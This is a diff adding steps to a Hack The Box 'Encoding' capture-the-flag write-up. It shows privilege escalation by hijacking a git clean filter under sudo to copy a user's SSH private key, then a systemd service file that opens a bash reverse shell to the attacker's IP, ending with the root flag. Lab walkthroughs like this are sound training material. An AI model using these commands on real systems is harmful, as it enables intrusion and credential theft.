@@ -480,6 +480,231 @@ _laurel:x:998:998::/var/log/laurel:/bin/false
 Now how do we get rce via this LFI from watching IPPSEC video on [Updown](https://www.youtube.com/watch?v=yW_lxWB1Yd0) i learnt LFI can be abused via a [PHP filters chain](https://github.com/synacktiv/php_filter_chain_generator)
 
 Here's the exploit
+![image](https://user-images.githubusercontent.com/113513376/218317602-b432c238-66b4-4173-a27e-af69c243a9c7.png)
+
+Now i'll stabilize the shell 
+
+```
+/usr/bin/script -qc /bin/bash /dev/null
+export TERM=xterm
+CTRL +Z 
+stty raw -echo;fg
+```
+
+Time to escalate priv as user svc
+
+Checking sudo permission shows the user www-data can run as a script as user svc
+
+```
+www-data@encoding:~$ ls /home
+svc
+www-data@encoding:~$ sudo -l
+Matching Defaults entries for www-data on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on encoding:
+    (svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+www-data@encoding:~$ 
+```
+
+Reading the file content shows this
+
+```
+www-data@encoding:~$ cat /var/www/image/scripts/git-commit.sh
+#!/bin/bash
+
+u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)
+
+if [[ $u ]]; then
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
+else
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
+fi
+www-data@encoding:~$ ls -l /var/www/image/scripts/git-commit.sh
+-rwxr-xr-x 1 svc svc 396 Feb 12 14:42 /var/www/image/scripts/git-commit.sh
+www-data@encoding:~$
+```
+
+Looking at the code of the git-commit.sh script, we can see that it is used to manage files in a Git repository
+If there are any files that have not yet been tracked by Git, they will be added to the next commit using the git add -A command
+If there are no unfollowed files, a commit will be made with a predefined message of Committed from API! and the author specified in the `git commit` command
+
+After some digging, I was able to determine that we can achieve a command execution by performing the following steps
+```
+1. Initialize a new repository in the /var/www/image folder
+2. Set an indent filter for all .php files
+3. Set up a command that runs a bash file 
+4. And finally run the git-commit.sh file as the svc user
+```
+
+I saved the command which will read the ssh key of the user and store in /dev/shm directory
+
+```
+www-data@encoding:~$ chmod +x /dev/shm/sshkey
+www-data@encoding:/dev/shm$ cat sshkey 
+cat ~/.ssh/id_rsa > /dev/shm/id_rsa
+www-data@encoding:/dev/shm$
+```
+
+Also it is important to note that you need to act quickly as there is a cron scheduled task that regularly deletes the contents of the /var/www/image folder and copies all files from the root/scripts/image folder to the /var/ folder www/image. This is probably to prevent any alteration to the files 🤔
+![image](https://user-images.githubusercontent.com/113513376/218318542-d0acfb6a-5b74-4a51-8c4b-c740f9ea8ddc.png)
+
+Here's the command to spawn the shell placed in the /dev/shm directory
+
+```
+git init
+echo '*.php filter=indent' > .git/info/attributes
+git config filter.indent.clean /dev/shm/sshkey
+sudo -u svc /var/www/image/scripts/git-commit.sh
+```
+
+On running it
+
+```
+www-data@encoding:~/image$ pwd 
+/var/www/image
+www-data@encoding:~/image$ git init
+Reinitialized existing Git repository in /var/www/image/.git/
+www-data@encoding:~/image$ echo '*.php filter=indent' > .git/info/attributes
+www-data@encoding:~/image$ git config filter.indent.clean /dev/shm/sshkey
+www-data@encoding:~/image$ sudo -u svc /var/www/image/scripts/git-commit.sh
+On branch master
+Changes not staged for commit:
+  (use "git add <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+        modified:   actions/action_handler.php
+        modified:   index.php
+        modified:   utils.php
+
+no changes added to commit (use "git add" and/or "git commit -a")
+www-data@encoding:~/image$ ls /dev/shm
+id_rsa  root.service  sshkey
+www-data@encoding:~/image$
+```
+
+Now we have the user's id_rsa key lets login to ssh 
+
+```
+┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
+└─$ chmod 600 idrsa
+                                                                                                        
+┌──(mark㉿haxor)-[~/Desktop/B2B/HTB/Encoding]
+└─$ ssh -i idrsa svc@haxtables.htb 
+The authenticity of host 'haxtables.htb (10.10.11.198)' can't be established.
+ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'haxtables.htb' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Feb 12 03:10:00 PM UTC 2023
+
+  System load:  0.0               Processes:             230
+  Usage of /:   65.3% of 4.33GB   Users logged in:       1
+  Memory usage: 15%               IPv4 address for eth0: 10.10.11.198
+  Swap usage:   0%
 
 
+0 updates can be applied immediately.
 
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun Feb 12 13:44:49 2023 from 10.10.14.102
+svc@encoding:~$ 
+```
+
+So time to escalate priv to root checking sudo perm shows the user svc can run systemctl restart on any service
+
+```
+svc@encoding:~$ sudo -l
+Matching Defaults entries for svc on encoding:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart *
+svc@encoding:~$
+```
+
+I'll get list of writeable file in /etc/ to abuse a service 
+
+```
+svc@encoding:~$ find /etc -writable 2>/dev/null
+/etc/systemd/user/session-migration.service
+/etc/systemd/system
+svc@encoding:~$
+```
+
+Cool seems we have access to now i'll create a service file that will grant us a shell
+
+```
+svc@encoding:/etc/systemd$ cd system/
+svc@encoding:/etc/systemd/system$ nano shell.service
+svc@encoding:/etc/systemd/system$ sudo -l
+Matching Defaults entries for svc on encoding:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on encoding:
+    (root) NOPASSWD: /usr/bin/systemctl restart *
+svc@encoding:/etc/systemd/system$ cat shell.service
+[Unit]
+Description=Shell
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/root
+ExecStart=bash -c 'bash -i >& /dev/tcp/10.10.14.100/1337 0>&1'
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+svc@encoding:/etc/systemd/system$ sudo /usr/bin/systemctl restart shell
+svc@encoding:/etc/systemd/system$
+```
+
+After restarting the service you get shell as root 
+
+```
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.100] from (UNKNOWN) [10.10.11.198] 56904
+bash: cannot set terminal process group (4318): Inappropriate ioctl for device
+bash: no job control in this shell
+root@encoding:~# ls -al
+ls -al
+total 36
+drwx------  5 root root 4096 Jan 24 11:58 .
+drwxr-xr-x 19 root root 4096 Jan 13 16:25 ..
+lrwxrwxrwx  1 root root    9 Jan 12 10:05 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  2 root root 4096 Jan 13 16:25 .cache
+-rw-r--r--  1 root root   50 Nov 10 18:15 .gitconfig
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Feb 12 13:10 root.txt
+drwxr-xr-x  4 root root 4096 Jan 13 16:25 scripts
+drwx------  2 root root 4096 Jan 13 16:25 .ssh
+root@encoding:~# cat root.txt
+cat root.txt
+d01ecb08a455de73cbf88deaee94be45
+root@encoding:~#
+```
+
+And we're done 
+
+<br> <br> 
+[Back To Home](../../index.md)
